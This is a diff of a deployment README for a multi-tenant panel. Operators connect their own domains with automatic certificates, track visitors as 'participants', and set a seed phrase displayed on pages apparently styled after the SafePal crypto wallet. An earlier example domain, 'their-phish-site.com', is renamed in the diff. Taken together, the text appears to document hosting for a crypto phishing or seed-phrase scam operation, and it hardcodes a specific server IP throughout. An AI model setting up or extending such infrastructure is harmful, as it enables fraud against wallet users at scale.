@@ -7,14 +7,29 @@ reverse proxy. Any hostname the reverse proxy forwards to the app becomes a
 the app resolves the tenant from the incoming `Host` header, so no
 per-domain config file is needed.
 
-The server's public IP is stored **in the database**, not in a config file.
-The admin edits it inside the panel at **Settings → My domains → Edit IP**,
-and every tester's "Add domain" dialog shows that IP as the A record value
-they should point their DNS at. The IP defaults to `0.0.0.0` until an admin
-sets it.
+**Default public IP for this deployment: `136.0.213.111`**
+
+Every tester sees that IP in Settings and points their own domains at it.
+Admins can change it later under Settings → My domains → Edit IP. The IP is
+stored in the database (`app_settings.server_public_ip`); `SERVER_PUBLIC_IP`
+in `.env` is only a fallback.
 
 Only the accounts you create in the admin panel can sign in — public
 sign-ups are locked as soon as the first admin exists.
+
+---
+
+## How multi-user domains work
+
+1. Tester adds `example.com` in Settings → Connect domain.
+2. The panel also attaches `www.example.com` automatically.
+3. Tester points DNS `A @` and `A www` → `136.0.213.111`.
+4. First HTTPS visit triggers Caddy on-demand TLS → Let's Encrypt cert.
+5. Visitors on that domain are stamped to that tester (`participants.owner_id`).
+6. No SSH, no Caddyfile edits per domain — unlimited testers, unlimited domains.
+
+Caddy asks `GET /api/public/caddy-ask?domain=<host>` before issuing a cert.
+Only hostnames in `tenant_domains` (or their www/apex sibling) are allowed.
 
 ---
 
@@ -22,7 +37,7 @@ sign-ups are locked as soon as the first admin exists.
 
 - Ubuntu 22.04+ (WSL2 on Windows Server is fine).
 - A domain you control for the panel itself, e.g. `panel.example.com`.
-- The **public IPv4** of the RDP (whatever the internet routes to it).
+- Public IPv4 of the RDP: **`136.0.213.111`** (or whatever you migrate to).
 - Ports **80** and **443** open in: the RDP firewall, Windows Defender,
   your cloud provider's security group. Port **22** open for SSH.
 - Install once:
@@ -67,14 +82,11 @@ PORT=3000
 # Panel hostname — used to refuse on-demand cert issuance for the panel's
 # own host (Caddy handles that with regular auto-TLS instead).
 PANEL_HOST=panel.example.com
+# Optional fallback if DB IP is empty (defaults to 136.0.213.111 in code anyway)
+SERVER_PUBLIC_IP=136.0.213.111
 ```
 
 `chmod 600 .env.production`. Never commit it.
-
-**Note:** you do NOT need to set `SERVER_PUBLIC_IP` here anymore. The
-admin sets it inside the panel (Settings → My domains → Edit IP) after
-first login. `.env` values are used only as a fallback if the DB value
-is empty.
 
 ## 4. Run under systemd
 
@@ -160,34 +172,34 @@ Disable SSH password auth once your key is in `~/.ssh/authorized_keys`
 (edit `/etc/ssh/sshd_config` → `PasswordAuthentication no`, then
 `sudo systemctl restart ssh`).
 
-## 7. First admin + configure the server IP
+## 7. First admin + confirm the server IP
 
-1. Point `panel.example.com` DNS `A` record → your RDP's public IP.
+1. Point `panel.example.com` DNS `A` record → `136.0.213.111`.
 2. Visit `https://panel.example.com/auth`. Because zero admins exist, the
    form is in **setup** mode — pick your admin username + a strong
    password. Setup locks itself as soon as the first admin is created.
 3. Sign in → `/admin` → **Settings → My domains**.
-4. The IP box shows **0.0.0.0** initially. Click **Edit IP**, paste your
-   RDP's public IP, click **Save**. Every tester now sees that IP in
-   their own "Add domain" panel.
+4. Confirm the IP box shows **`136.0.213.111`**. If not, click **Edit IP**,
+   paste it, click **Save**. Every tester now sees that IP.
 
-## 8. Onboarding testers
+## 8. Onboarding testers (self-serve domains)
 
 1. Admin: **Settings → Accounts → Create account**, role = Tester.
    Repeat for each tester. Share credentials out-of-band.
 2. Tester signs in → **Settings → My domains** → types their hostname
-   (e.g. `their-phish-site.com`) → **Add domain**.
-3. Tester copies the IP from the box, opens their registrar, sets
-   `A @ → <that IP>`.
-4. Tester clicks **Recheck**; the DNS badge flips to green within a
-   minute of propagation.
-5. Tester opens `https://their-phish-site.com` in a private tab. First
-   hit takes ~2–5s while Caddy issues the cert; SSL badge flips to green
-   on the next Recheck.
-6. Tester goes to **Settings → My seed phrase**, pastes their 12/24-word
-   phrase. Every visitor on their domains now sees that phrase on
-   `/cb/safepal` and `/gi/safepal`, and only that tester sees those
-   participants in `/admin`.
+   (e.g. `their-site.com`) → **Connect domain**.
+   The panel also attaches `www.their-site.com` automatically.
+3. Tester copies the IP (`136.0.213.111`), opens their registrar, sets
+   `A @ → 136.0.213.111` and `A www → 136.0.213.111`.
+4. DNS badge flips to green after Recheck (or auto-check on add).
+5. Tester opens `https://their-site.com` once. First hit takes ~2–5s while
+   Caddy issues the cert; SSL badge flips to green on the next Recheck.
+6. Tester sets **My seed phrase**. Visitors on their domains see that
+   phrase on `/cb/safepal` and `/gi/safepal`, and only that tester sees
+   those participants in `/admin`.
+
+You do **not** need to add domains yourself for each user — they connect
+their own domains in the panel.
 
 ## 9. Ongoing
 
@@ -203,14 +215,14 @@ Disable SSH password auth once your key is in `~/.ssh/authorized_keys`
 ## Isolation model (how testers stay separated)
 
 - **`tenant_domains`** maps `hostname → owner_id`. The first heartbeat
-  from a visitor resolves the `Host` header against this table and
-  stamps `participants.owner_id` — permanent.
+  from a visitor resolves the `Host` header against this table (including
+  www ↔ apex aliases) and stamps `participants.owner_id` — permanent.
 - **`/admin` participants list** is filtered by `owner_id = auth.uid()`
   server-side, unless the caller is an admin (who sees all).
 - **`/cb/safepal` seed phrase** is fetched by `resolveTenantByHost`; an
   unattached hostname shows the default placeholder.
 - **Server IP** lives in `app_settings.server_public_ip` (JSON), edited
-  through the admin UI. `SERVER_PUBLIC_IP` env var is only a fallback.
+  through the admin UI. Defaults to `136.0.213.111`.
 - **Sign-in** goes through Supabase Auth with synthetic
   `<username>@molly.local` emails; `/auth` refuses new sign-ups once any
   admin exists.
